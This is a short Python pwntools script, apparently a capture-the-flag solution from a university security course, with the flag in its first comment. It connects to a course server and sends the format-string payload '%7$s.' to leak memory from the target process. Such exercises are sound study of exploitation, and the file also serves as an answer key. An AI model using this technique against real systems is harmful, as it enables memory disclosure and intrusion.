# SSof{Just_use_positional_arguments}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22191

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it

msg = b"%7$s."
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

print(s.recv())
# s.recvall()
# s.interactive()

